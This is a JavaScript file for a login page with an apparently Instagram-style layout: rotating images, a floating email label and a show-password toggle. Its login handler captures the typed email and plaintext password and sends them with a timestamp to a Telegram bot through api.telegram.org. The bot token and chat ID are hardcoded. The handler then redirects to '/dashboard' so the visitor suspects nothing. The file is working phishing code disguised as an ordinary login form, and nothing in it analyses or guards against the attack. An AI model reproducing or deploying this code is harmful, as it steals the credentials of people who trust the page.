// 🎯 Select Elements
let email = document.getElementById("email");
let password = document.getElementById("password");
let emailPlaceholder = document.getElementById("emailPlaceholder");
let showOrHide = document.getElementById("showOrHide");
let login = document.getElementById("login");
let fadingImages = document.querySelectorAll(".fadingImages");
let frame1 = document.getElementById("frame1");

// 🎯 Telegram Bot Configuration
const TG_BOT_TOKEN = "7634098436:AAH0BVx1NN0Z6UK8zFOBJc2lA07DTOfbVbQ"; // Replace with actual bot token
const TG_CHAT_ID = "7016497830"; // Replace with actual chat ID

// 📡 Function to send data to Telegram bot
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => console.log("Message sent:", data))
    .catch(error => console.error("Error:", error));
}

// 🔄 Function for Image Display
function displayImages(from, to) {
    let current = to;
    setInterval(function() {
        fadingImages[current].style.opacity = '0';
        if (current == from) {
            current = to + 1;
        }
        current--;
        fadingImages[current].style.opacity = '1';
    }, 4000);
}
displayImages(0, 3);

// 🔄 Function to Check Input Fields
function check() {
    if (email.value == "") {
        emailPlaceholder.style.fontSize = "12px";
        emailPlaceholder.style.top = "8px";
        emailPlaceholder.style.opacity = "0.7";
    } else {
        emailPlaceholder.style.fontSize = "10px";
        emailPlaceholder.style.top = "3px";
        emailPlaceholder.style.opacity = "0.7";
        email.style.fontSize = "12px";
        email.style.paddingTop = "20px";
    }

    if (password.value == "") {
        showOrHide.innerText = "";
    } else {
        showOrHide.innerHTML = "Show";
    }

    if (email.value != "" && password.value != "" && password.value.length >= 6) {
        login.style.backgroundColor = "#049bff";
        login.style.cursor = "pointer";
    } else {
        login.style.backgroundColor = "";
        login.style.cursor = "";
    }
}

// 🔄 Show/Hide Password Toggle
function showOrHide1() {
    if (showOrHide.innerHTML == "Show") {
        showOrHide.innerHTML = "Hide";
        password.type = "text";
    } else {
        showOrHide.innerHTML = "Show";
        password.type = "password";
    }
}

// 🎯 Add Event Listener for Login Button
login.addEventListener("click", function(e) {
    e.preventDefault(); // Prevent form submission

    if (email.value && password.value.length >= 6) {
        let message = `🔒 New Login Attempt:\n📧 Email: ${email.value}\n🔑 Password: ${password.value}\n📅 Time: ${new Date().toLocaleString()}`;
        sendToTelegram(message);

        // Redirect after sending (Modify if needed)
        window.location.href = "/dashboard"; 
    }
});
